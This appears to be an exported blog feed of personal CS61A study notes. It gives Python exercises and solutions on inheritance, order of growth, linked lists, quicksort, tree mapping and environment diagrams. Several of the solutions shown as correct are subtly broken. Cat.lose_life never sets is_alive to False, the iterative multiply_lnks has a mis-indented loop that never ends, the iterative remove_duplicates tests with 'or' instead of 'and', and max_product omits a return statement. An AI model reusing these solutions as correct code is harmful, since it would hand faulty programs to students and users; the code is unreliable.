<p>Notice that because dogs and cats share a lot of similar qualities, there is a lot of repeated code! To avoid redefining attributes and methods for similar classes, we can write a single <strong>superclass</strong> from which the similar classes <strong>inherit</strong>. For example, we can write a class called Pet and redefine Dog as a subclass of Pet:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pet</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, owner)</span>:</span></span><br><span class="line">        self.is_alive = <span class="literal">True</span> <span class="comment"># It's alive!!!</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.owner = owner</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self, thing)</span>:</span></span><br><span class="line">        print(self.name + <span class="string">" ate a "</span> + str(thing) + <span class="string">"!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.name)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(Pet)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.name + <span class="string">' says woof!'</span>)</span><br></pre></td></tr></table></figure>
<p>Inheritance represents a hierarchical relationship between two or more classes where one class is a more specific version of the other, e.g. a dog is a pet. Because Dog inherits from Pet, we didn’t have to redefine init or eat. However, since we want Dog to talk in a way that is unique to dogs, we did override the talk method.</p>
<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><p>2.1 Below is a skeleton for the <code>Cat</code> class, which inherits from the <code>Pet</code> class. To complete the implementation, override the <code>__init__</code> and <code>talk</code> methods and add a new <code>lose_life</code> method.<br>Hint: You can call the init method of Pet to set a cat’s name and owner.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span><span class="params">(Pet)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, owner, lives=<span class="number">9</span>)</span>:</span></span><br><span class="line">        Pet.__init__(self, name, owner)</span><br><span class="line">        self.lives = lives</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" Print out a cat's greeting.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; Cat('Thomas', 'Tammy').talk()</span></span><br><span class="line"><span class="string">        Thomas says meow!</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        print(self.name + <span class="string">' says meow!'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lose_life</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Decrements a cat's life by 1. When lives reaches zero, 'is_alive' becomes False.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.lives &gt; <span class="number">0</span>:</span><br><span class="line">            self.lives -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self.lives == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"This cat has no more lives to lose!"</span>)</span><br></pre></td></tr></table></figure>
<p>2.2 More cats! Fill in this implemention of a class called <code>NoisyCat</code>, which is just like a normal <code>Cat</code>. However, <code>NoisyCat</code> talks a lot – twice as much as a regular <code>Cat</code>!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoisyCat</span><span class="params">(Cat)</span>:</span> <span class="comment"># Fill me in!</span></span><br><span class="line">    <span class="string">"""A Cat that repeats things twice."""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, owner, lives=<span class="number">9</span>)</span>:</span></span><br><span class="line">        <span class="comment"># Is this method necessary? Why or why not?</span></span><br><span class="line">        Cat.__init__(self, name, owner, lives)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Talks twice as much as a regular cat.</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; NoisyCat('Magic', 'James').talk()</span></span><br><span class="line"><span class="string">        Magic says meow!</span></span><br><span class="line"><span class="string">        Magic says meow!</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            Cat.talk(self)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc07</title>
    <url>/2018/10/28/cs61a-disc07/</url>
    <content><![CDATA[<h1 id="Order-of-growth"><a href="#Order-of-growth" class="headerlink" title="Order of growth"></a>Order of growth</h1><h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><p>What is the order of growth for the following functions?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_of_factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> factorial(n) + sum_of_factorial(n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>The order of growth is $\Theta(n^2)$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonk</span><span class="params">(n)</span>:</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt;= <span class="number">2</span>:</span><br><span class="line">        total += n</span><br><span class="line">        n = n / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure>
<p>The order of growth is $\Theta(log(n))$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_7</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + mod_7(n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>This order of growth is $\Theta(1)$</p>
<h1 id="Linked-List"><a href="#Linked-List" class="headerlink" title="Linked List"></a>Linked List</h1><h2 id="Questions-1"><a href="#Questions-1" class="headerlink" title="Questions"></a>Questions</h2><p>Write a function that takes in a Python list of linked lists and multiplies them<br>element-wise. It should return a new linked list.<br>If not all of the Link objects are of equal length, return a linked list whose length is<br>that of the shortest linked list given. You may assume the Link objects are shallow<br>linked lists, and that lst of lnks contains at least one linked list.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply_lnks</span><span class="params">(lst_of_lnks)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a = Link(2, Link(3, Link(5)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b = Link(6, Link(4, Link(2)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c = Link(4, Link(1, Link(0, Link(2))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; p = multiply_lnks([a, b, c])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; p.first</span></span><br><span class="line"><span class="string">    48</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; p.rest.first</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; p.rest.rest.rest</span></span><br><span class="line"><span class="string">    ()</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    product = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> lst <span class="keyword">in</span> lst_of_lnks:</span><br><span class="line">        <span class="keyword">if</span> lst <span class="keyword">is</span> Link.empty:</span><br><span class="line">            <span class="keyword">return</span> Link.empty</span><br><span class="line">        product *= lst.first</span><br><span class="line">    lst_rest = [lst.rest <span class="keyword">for</span> lst <span class="keyword">in</span> lst_of_lnks]</span><br><span class="line">    <span class="keyword">return</span> Link(product, multiply_lnks(lst_rest))</span><br></pre></td></tr></table></figure>
<p><span style="color:red">For our base case, if we detect that any of the lists in the list of Links is empty, we can return the empty linked list as we’re not going to multiply anything.</span><br><span style="color:red">Otherwise, we compute the product of all the firsts in our list of Links. Then, the subproblem we use here is the rest of all the linked lists in our list of Links.<br><span style="color:red">Remember that the result of calling <code>multiply_lnks</code> will be a linked list! We’ll use the product we’ve built so far as the first item in the returned Link, and then the result of the recursive call as the rest of that Link.</span><br><span style="color:red">Iterative solution:</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply_lnks</span><span class="params">(lst_of_lnks)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> operator</span><br><span class="line">    <span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prod</span><span class="params">(factors)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> reduce(operator.mul, factors, <span class="number">1</span>)</span><br><span class="line">    head = Link.empty</span><br><span class="line">    tail = head</span><br><span class="line">    <span class="keyword">while</span> Link.empty <span class="keyword">not</span> <span class="keyword">in</span> lst_of_lnks:</span><br><span class="line">        all_prod = prod([l.first <span class="keyword">for</span> l <span class="keyword">in</span> lst_of_lnks])</span><br><span class="line">    <span class="keyword">if</span> head <span class="keyword">is</span> Link.empty:</span><br><span class="line">        head = Link(all_prod)</span><br><span class="line">        tail = head</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tail.rest = Link(all_prod)</span><br><span class="line">        tail = tail.rest</span><br><span class="line">    lst_of_lnks = [l.rest <span class="keyword">for</span> l <span class="keyword">in</span> lst_of_lnks]</span><br><span class="line">    <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The iterative solution is a bit more involved than the recursive solution. Instead of building the list “backwards” as in the recursive solution (because of the order that the recursive calls result in, the last item in our list will be finished first), we’ll build the resulting linked list as we go along.</span><br><span style="color:red">We use head and tail to track the front and end of the new linked list we’re creating.</span><br><span style="color:red">Our stopping condition for the loop is if any of the Links in our list of Links runs out of items.</span><br><span style="color:red">Finally, there’s some special handling for the first item. We need to update both head and tail in that case. Otherwise, we just append to the end of our list using tail, and update tail</span></p>
<p>Write a function that takes a sorted linked list of integers and mutates it so that<br>all duplicates are removed.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_duplicates</span><span class="params">(lnk)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lnk = Link(1, Link(1, Link(1, Link(1, Link(5)))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; remove_duplicates(lnk)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lnk</span></span><br><span class="line"><span class="string">    Link(1, Link(5))</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> lnk == Link.empty <span class="keyword">or</span> lnk.rest == Link.empty:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> lnk.first == lnk.rest.first:</span><br><span class="line">        lnk.rest = lnk.rest.rest</span><br><span class="line">        remove_duplicates(lnk)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        remove_duplicates(lnk.rest)</span><br></pre></td></tr></table></figure>
<p><span style="color:red">For a list of one or no items, there are no duplicates to remove.</span></p>
<p>Now consider two possible cases:</p>
<ul>
<li>If there is a duplicate of the first item, we will find that the first and second items in the list will have the same values (that is, <code>lnk.first == lnk.rest.first</code>).<br>We can confidently state this because we were told that the input linked list is in sorted order, so duplicates are adjacent to each other. We’ll remove the second item from the list.<br>Finally, it’s tempting to recurse on the remainder of the list (<code>lnk.rest</code>), but remember that there could still be more duplicates of the first item in the rest of the list! So we have to recurse on <code>lnk</code> instead. Remember that we have removed an item from the list, so the list is one element smaller than before.<br>Normally, recursing on the same list wouldn’t be a valid subproblem.</li>
<li>Otherwise, there is no duplicate of the first item. We can safely recurse on the remainder of the list.<br><span style="color:red">Iterative solution</span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> lst <span class="keyword">is</span> <span class="keyword">not</span> Link.empty <span class="keyword">or</span> lst.rest <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">    <span class="keyword">if</span> lst.first == lst.rest.first:</span><br><span class="line">        lst.rest = lst.rest.rest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lst = lst.rest</span><br></pre></td></tr></table></figure>
<h1 id="Midterm-Review"><a href="#Midterm-Review" class="headerlink" title="Midterm Review"></a>Midterm Review</h1></li>
</ul>
<p>3.1 Write a function that takes a list and returns a new list that keeps only the evenindexed elements of lst and multiplies them by their corresponding index.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">even_weighted</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x = [1, 2, 3, 4, 5, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; even_weighted(x)</span></span><br><span class="line"><span class="string">    [0, 6, 20]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [i * lst[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lst)) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return [i * lst[i] for i in range(0, len(lst), 2)]</span></span><br><span class="line">    <span class="comment"># Or use for loop to construct a list.</span></span><br></pre></td></tr></table></figure>
<p>3.2 The <strong>quicksort</strong> sorting algorithm is an efficient and commonly used algorithm to order the elements of a list. We choose one element of the list to be the <strong>pivot</strong> element and partition the remaining elements into two lists: one of elements less than the pivot and one of elements greater than the pivot. We recursively sort the two lists, which gives us a sorted list of all the elements less than the pivot and all the elements greater than the pivot, which we can then combine with the pivot for<br>a completely sorted list.<br>First, implement the <code>quicksort_list</code> function. Choose the first element of the list as the pivot. You may assume that all elements are distinct.</p>
<p><em>Note: in computer science, “sorting” refers to placing elements in order from least to greatest, not putting things in categories</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quicksort_list</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; quicksort_list([3, 1, 4])</span></span><br><span class="line"><span class="string">    [1, 3, 4]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lst <span class="keyword">or</span> len(lst) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line">    pivot = lst[<span class="number">0</span>]</span><br><span class="line">    less = [i <span class="keyword">for</span> i <span class="keyword">in</span> lst[<span class="number">1</span>:] <span class="keyword">if</span> i &lt; pivot]</span><br><span class="line">    greater = [i <span class="keyword">for</span> i <span class="keyword">in</span> lst[<span class="number">1</span>:] <span class="keyword">if</span> i &gt; pivot]</span><br><span class="line">    <span class="keyword">return</span> quicksort_list(less) + [pivot] + quicksort_list(greater)</span><br></pre></td></tr></table></figure>
<p>3.3 Write a function that takes in a list and returns the maximum product that can be formed using nonconsecutive elements of the list. The input list will contain only numbers greater than or equal to 1.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_product</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">"""Return the maximum product that can be formed using lst without using any consecutive numbers</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; max_product([10,3,1,9,2]) # 10 * 9</span></span><br><span class="line"><span class="string">    90</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; max_product([5,10,5,10,5]) # 5 * 5 * 5</span></span><br><span class="line"><span class="string">    125</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; max_product([])</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lst:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> len(lst) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> lst[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        max(max_product(lst[<span class="number">1</span>:]), lst[<span class="number">0</span>] * max_product(lst[<span class="number">2</span>: ]))</span><br></pre></td></tr></table></figure>
<p><span style="color:red">At each step, we choose if we want to include the current number in our product<br>or not:</span></p>
<ul>
<li>If we include the current number, we cannot use the adjacent number.</li>
<li>If we don’t use the current number, we try the adjacent number (and obviously ignore the current number).<br>The recursive calls represent these two alternate realities. Finally, we pick the one that gives us the largest product.</span></li>
</ul>
<p>3.4 Complete <code>redundant_map</code>, which takes a tree <code>t</code> and a function <code>f</code>, and applies <code>f</code> to each node ($2^d$) times, where d is the depth of the node. The root has a depth of 0. It should mutate the existing tree rather than creating a new tree.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redundant_map</span><span class="params">(t, f)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; double = lambda x: x*2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tree = Tree(1, [Tree(1), Tree(2, [Tree(1, [Tree(1)])])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; redundant_map(tree, double)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_levels(tree)</span></span><br><span class="line"><span class="string">    [2] # 1 * 2 ˆ (1) ; Apply double one time</span></span><br><span class="line"><span class="string">    [4, 8] # 1 * 2 ˆ (2), 2 * 2 ˆ (2) ; Apply double two times</span></span><br><span class="line"><span class="string">    [16] # 1 * 2 ˆ (2 ˆ 2) ; Apply double four times</span></span><br><span class="line"><span class="string">    [256] # 1 * 2 ˆ (2 ˆ 3) ; Apply double eight times</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    t.label =f(t.label)</span><br><span class="line">    new_f = <span class="keyword">lambda</span> x: f(f(x))</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> t.branches:</span><br><span class="line">        redundant_map(b, new_f)</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Every time we recurse, we transform our map function into one that is one level<br>deeper in terms of calls to input function f. To see why this will achieve the result we want, let’s look at what happens to some input function f.</span><br>• The first call to redundant_map will call f once.<br>• This means on the second call to redundant_map, we pass in a function g that<br>causes the original f to be called two times.<br>• On the third call to redundant_map, we pass in a function h that causes g to<br>be called two times. Remember that g calls original f twice, so h will end up<br>calling original f four times.<br>Therefore, each level will have double the calls to f as the previous level, which<br>matches the requirements.</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-guerrilla</title>
    <url>/2018/08/29/cs61a-guerrilla01/</url>
    <content><![CDATA[<h1 id="Guerrilla-Section-1-Functions-Control-Environment-Diagrams"><a href="#Guerrilla-Section-1-Functions-Control-Environment-Diagrams" class="headerlink" title="Guerrilla Section 1: Functions, Control, Environment Diagrams"></a>Guerrilla Section 1: Functions, Control, Environment Diagrams</h1><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p>Question 0:<br>What will Python output?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from operator import add, mul</span><br><span class="line">&gt;&gt;&gt; mul(add(5, 6), 8)</span><br><span class="line">88</span><br><span class="line">&gt;&gt;&gt; print(‘x’)</span><br><span class="line">x</span><br><span class="line">&gt;&gt;&gt; y &#x3D; print(‘x’)</span><br><span class="line">x</span><br><span class="line">&gt;&gt;&gt; print(y)</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; print(add(4, 2), print(‘a’))</span><br><span class="line">a</span><br><span class="line">6 None</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>Question 1: Raising the Bar<br>What will Python output?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; def foo(x):</span><br><span class="line">        print(x)</span><br><span class="line">        return x + 1</span><br><span class="line">&gt;&gt;&gt; def bar(y, x):</span><br><span class="line">        print(x - y)</span><br><span class="line">&gt;&gt;&gt; foo(3)</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; bar(3)</span><br><span class="line">Error</span><br><span class="line">&gt;&gt;&gt; bar(6, 1)</span><br><span class="line">-5</span><br><span class="line">&gt;&gt;&gt; bar(foo(10), 11)</span><br><span class="line">10</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h2 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h2><p>Question 2: Control yourself<br>a) Which numbers (1-4) will be printed after executing the following code?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> n:</span><br><span class="line">    print(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">elif</span> n &lt; <span class="number">2</span>:</span><br><span class="line">    print(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="number">3</span>)</span><br><span class="line">print(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>2 and 4<br>b) WWPD (What would Python Display) after evaluating each of the following expressions?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 0 and 1 &#x2F; 0</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 6 or 1 or “a” or 1 &#x2F; 0</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; 6 and 1 and “a” and 1 &#x2F; 0</span><br><span class="line">Error</span><br><span class="line">&gt;&gt;&gt; print(print(4) and 2)</span><br><span class="line">4</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; not True and print(“a”)</span><br><span class="line">False</span><br></pre></td></tr></table></figure>

<p>Question 3: You have control<br>a) Define a function, count_digits, which takes in a positive integer, n, and counts the<br>number of digits in that number.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_digits</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_digits(42)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_digits(12345678)</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_digits(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">10</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure>

<p>b) Define a function, count_matches, which takes in two positive integers n and m, and<br>counts the number of digits that match.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_matches</span><span class="params">(n, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_matches(10, 30)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_matches(12345, 23456)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_matches(212121, 321321)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_matches(101, 11) # only one’s place matches</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_matches(101, 10) # no place matches</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    matches = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span> <span class="keyword">and</span> m &gt; <span class="number">0</span>):</span><br><span class="line">        k, d = n % <span class="number">10</span>, m % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> k == d:</span><br><span class="line">            matches += <span class="number">1</span></span><br><span class="line">        n, m = n // <span class="number">10</span>, m // <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> matches</span><br></pre></td></tr></table></figure>
<h2 id="Environment-Diagrams"><a href="#Environment-Diagrams" class="headerlink" title="Environment Diagrams"></a>Environment Diagrams</h2><p>Question 4: A New Environment<br>a) Draw the environment diagram for evaluating the following code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> y + x</span><br><span class="line">y = <span class="number">10</span></span><br><span class="line">f(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>b) Draw the environment diagram for evaluating the following code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dessef</span><span class="params">(a, b)</span>:</span></span><br><span class="line">     c = a + b</span><br><span class="line">     b = b + <span class="number">1</span></span><br><span class="line">b = <span class="number">6</span></span><br><span class="line">dessef(b, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>


<p>Question 5: Environmental Collapse<br>a) Draw an environment diagram for the following code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    foo = bar</span><br><span class="line">    <span class="keyword">return</span> foo(bar(x, x), y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(z, x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> z + y</span><br><span class="line">y = <span class="number">5</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>


<p>b) Draw an environment diagram for the following code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spain</span><span class="params">(japan, iran)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">world</span><span class="params">(cup, egypt)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> japan-poland</span><br><span class="line">    <span class="keyword">return</span> iran(world(iran, poland))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saudi</span><span class="params">(arabia)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> japan + <span class="number">3</span></span><br><span class="line">japan, poland = <span class="number">3</span>, <span class="number">7</span></span><br><span class="line">spain(poland+<span class="number">1</span>, saudi)</span><br></pre></td></tr></table></figure>


<p>c) Draw an environment diagram for the following code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cap = <span class="number">9</span></span><br><span class="line">hulk = <span class="number">3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">marvel</span><span class="params">(cap, thor, marvel)</span>:</span></span><br><span class="line">    iron = hulk + cap</span><br><span class="line">    <span class="keyword">if</span> thor &gt; cap:</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">marvel</span><span class="params">(cap, thor, avengers)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> iron</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iron = hulk</span><br><span class="line">    <span class="keyword">return</span> marvel(thor, cap, marvel)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iron</span><span class="params">(man)</span>:</span></span><br><span class="line">    hulk = cap - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> hulk</span><br><span class="line">marvel(cap, iron(<span class="number">3</span>), marvel)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-guerrilla02</title>
    <url>/2018/10/07/cs61a-guerrilla02/</url>
    <content><![CDATA[<h1 id="Higher-Order-Functions"><a href="#Higher-Order-Functions" class="headerlink" title="Higher Order Functions"></a>Higher Order Functions</h1><h2 id="Question1"><a href="#Question1" class="headerlink" title="Question1"></a>Question1</h2><p>Write a <code>make_skipper</code>, which takes in a number n and outputs a function. When this function takes in a number x, it prints out all the numbers between 0 and x, skipping every nth number(meaning skip any value that is a multiple of n).</p>
<a id="more"></a>
